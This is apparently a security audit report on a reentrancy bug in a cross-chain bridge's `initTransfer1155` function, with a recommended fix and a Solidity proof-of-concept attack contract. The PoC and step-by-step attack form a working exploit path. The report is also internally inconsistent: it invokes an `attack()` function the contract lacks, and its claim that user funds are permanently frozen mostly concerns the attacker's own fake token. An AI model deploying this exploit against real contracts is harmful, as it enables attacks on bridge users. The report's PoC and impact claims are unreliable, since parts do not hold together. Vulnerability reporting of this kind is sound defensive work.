### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Corrupts `currentOriginNonce`, Permanently Locking Bridged Tokens - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` increments `currentOriginNonce` before the external `safeTransferFrom` call but reads `currentOriginNonce` again **after** that call when invoking `initTransferExtension` and emitting `InitTransfer`. A malicious ERC1155 token can reenter `initTransfer1155` inside its `safeTransferFrom` callback, incrementing the nonce a second time. When the outer call resumes, it publishes a Wormhole message with the wrong (already-used) nonce, while the correct nonce is never published. The outer call's tokens are permanently locked in the bridge.

---

### Finding Description

In `OmniBridge.sol`, `initTransfer1155` follows this sequence:

```
currentOriginNonce += 1;                          // line 448 → nonce = N
...
IERC1155(tokenAddress).safeTransferFrom(          // line 458 → external call, ERC1155 callback
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...)  // line 471 → reads LIVE storage value
...
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)  // line 483 → reads LIVE storage value
``` [1](#0-0) 

The nonce is captured at line 448 but **never stored in a local variable**. Lines 471 and 483 re-read `currentOriginNonce` from storage after the external call. ERC1155's `safeTransferFrom` mandates a call to `onERC1155Received` on the recipient, but the callback that enables reentrancy fires **inside the token contract's own `safeTransferFrom`** — before it returns to the bridge. A malicious ERC1155 token can call back into `initTransfer1155` from within its `safeTransferFrom` body.

The bridge's `onERC1155Received` guard checks `operator != address(this)`: [2](#0-1) 

This guard does **not** block the attack. In the reentrant call, the bridge itself calls `maliciousToken.safeTransferFrom(maliciousToken, bridge, ...)`, so the ERC1155 token calls `onERC1155Received(operator=bridge, ...)` — `operator == address(this)` — and the check passes.

**Step-by-step attack:**

1. Attacker deploys a malicious ERC1155 token `M` and pre-funds it with ETH for Wormhole fees.
2. Attacker calls `initTransfer1155(M, tokenId, amount, fee, nativeFee, recipient, "")`.
3. Bridge: `currentOriginNonce` → **N**.
4. Bridge calls `M.safeTransferFrom(attacker, bridge, ...)`.
5. Inside `M.safeTransferFrom`, the malicious token calls back into `initTransfer1155(M, tokenId, amount, fee, nativeFee, recipient2, "")` (sending ETH for the Wormhole fee).
6. Bridge: `currentOriginNonce` → **N+1**.
7. Bridge calls `M.safeTransferFrom(M, bridge, ...)` — malicious token returns success and calls `onERC1155Received(bridge, M, ...)` — passes guard.
8. Bridge calls `initTransferExtension(..., currentOriginNonce=N+1, ...)` → Wormhole message published with nonce **N+1**. [3](#0-2) 
9. Reentrant call returns. Malicious token calls `onERC1155Received(bridge, attacker, ...)` — passes guard.
10. Outer call resumes: `initTransferExtension(..., currentOriginNonce=N+1, ...)` → **second** Wormhole message published with nonce **N+1**.
11. Outer `emit InitTransfer(..., N+1, ...)` — event also carries wrong nonce.

**Final state:**
- Two Wormhole messages carry nonce N+1 (inner call's transfer and outer call's transfer).
- Nonce N is **never published**.
- NEAR processes the first N+1 message, marks nonce N+1 as used, and rejects the second N+1 message as a duplicate.
- The outer call's tokens (`amount` of ERC1155 token) are held by the bridge contract with no corresponding cross-chain message — **permanently locked**.

---

### Impact Explanation

The outer call's ERC1155 tokens are transferred into the bridge at line 458 and never recoverable: NEAR rejects the duplicate-nonce Wormhole message, so no `finTransfer` on NEAR is ever triggered for those tokens. This is **permanent, irrecoverable freezing of user funds** in the bridge — matching the critical allowed impact: *"Permanent freezing, irrecoverable lock, or unclaimable settlement of user or protocol funds in bridge, token, or vault flows."*

Additionally, if NEAR's nonce deduplication is not strict, the second N+1 message could be processed, minting tokens on NEAR for the outer call's recipient without a valid corresponding lock — an unbacked mint.

---

### Likelihood Explanation

Any unprivileged user can deploy a malicious ERC1155 token and call `initTransfer1155` with it. No privileged access, no colluding operators, and no external dependency compromise is required. The ERC1155 callback mechanism is a standard, well-known reentrancy vector. The only prerequisite is pre-funding the malicious contract with enough ETH to cover the Wormhole message fee for the reentrant call.

---

### Recommendation

1. **Cache `currentOriginNonce` in a local variable** immediately after incrementing it, and use the local variable in all subsequent reads:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce;  // cache before any external call
    ...
    IERC1155(tokenAddress).safeTransferFrom(...);
    ...
    initTransferExtension(..., nonce, ...);   // use cached value
    emit BridgeTypes.InitTransfer(..., nonce, ...);  // use cached value
}
```

2. Apply the same fix to `initTransfer` for consistency (same pattern at lines 381/418/430).

3. Consider adding a `ReentrancyGuard` (OpenZeppelin's `nonReentrant` modifier) to both `initTransfer` and `initTransfer1155` as defense-in-depth.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

interface IERC1155Receiver {
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4);
}

contract MaliciousERC1155 {
    IOmniBridge bridge;
    bool attacked;

    constructor(address _bridge) payable { bridge = IOmniBridge(_bridge); }

    // Called by bridge: safeTransferFrom(attacker, bridge, tokenId, amount, "")
    // and safeTransferFrom(this, bridge, tokenId, amount, "") in reentrant call
    function safeTransferFrom(address, address to, uint256 tokenId, uint256 amount, bytes calldata) external {
        if (!attacked) {
            attacked = true;
            // Reenter initTransfer1155 — currentOriginNonce goes from N to N+1
            // Wormhole message published with nonce N+1 here
            bridge.initTransfer1155{value: address(this).balance / 2}(
                address(this), tokenId, uint128(amount), 0, 0, "alice.near", ""
            );
        }
        // Call onERC1155Received on bridge — operator = bridge = address(this) → passes guard
        IERC1155Receiver(to).onERC1155Received(msg.sender, address(this), tokenId, amount, "");
    }

    // Outer initTransfer1155 resumes here:
    // initTransferExtension called with currentOriginNonce = N+1 (WRONG)
    // Second Wormhole message published with nonce N+1
    // Outer tokens permanently locked — NEAR rejects duplicate nonce N+1

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    receive() external payable {}
}
```

The attacker calls `MaliciousERC1155.attack()` → `bridge.initTransfer1155{value: wormholeFee}(maliciousToken, ...)`. After execution, `currentOriginNonce` on the bridge is N+1, two Wormhole messages carry nonce N+1, nonce N is never published, and the outer call's tokens are locked in the bridge with no redemption path.
